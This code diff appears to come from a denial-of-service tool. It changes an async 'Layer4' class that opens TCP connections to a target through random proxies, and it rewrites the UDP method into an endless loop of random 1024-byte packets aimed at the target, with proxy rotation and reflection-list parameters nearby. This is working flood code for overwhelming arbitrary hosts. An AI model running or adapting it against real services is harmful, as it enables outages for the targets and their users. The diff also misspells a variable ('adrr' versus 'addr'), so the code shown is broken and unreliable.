@@ -1158,18 +1158,18 @@ class AsyncLayer4(Layer4):
         sock_type=SOCK_STREAM,
         proto_type=IPPROTO_TCP,
     ) -> socket:
-        is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
+        adrr, port = self._target
+        is_tls = port == 443
         if self._proxies:
             proxy_url: str = self._proxies.pick_random()
             reader, writer = await aiohttp_socks.open_connection(
                 proxy_url=proxy_url,
-                host=self._target.host,
-                port=self._target.port,
+                host=addr,
+                port=port,
                 ssl=ctx if is_tls else None
             )
         else:
-            reader, writer = await asyncio.open_connection(
-                host=self._target.host, port=self._target.port, ssl=is_tls)
+            reader, writer = await asyncio.open_connection(host=addr, port=port, ssl=is_tls)
         return reader, writer
 
     async def TCP(self) -> int:
@@ -1187,17 +1187,16 @@ class AsyncLayer4(Layer4):
 
     async def UDP(self) -> int:
         packets_sent, packet_size = 0, 1024
-        # XXX: this is not going to work as well
+        # XXX: this is not going to work as well, need to pass as params
         loop = asyncio.get_event_loop()
-        # XXX: using callback-based Protocol is just .. awful :(
-        transport, protocol = loop.create_datagram_endpoint(
-            asyncio.DatagramProtocol, remote_addr=self._raw_target)
-        # XXX: does it even support RCP config?
-        for _ in range(100):
-            # let the loop to run other callbacks though it looks ugly
-            await loop.call_soon(transport.sendto, randbytes(packet_size))
-            packets += 1
-        return packets
+        with socket(AF_INET, SOCK_DGRAM) as sock:
+            await asyncio.wait_for(loop.sock_connect(sock, self._target), timeout=8)
+            while True:
+                packet = randbytes(packet_size)
+                await asyncio.wait_for(loop.sock_sendall(sock, packet), timeout=1)
+                self._stats.track(1, packet_size)
+                packets_sent += 1
+        return packets_sent
 
 
 def async_main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
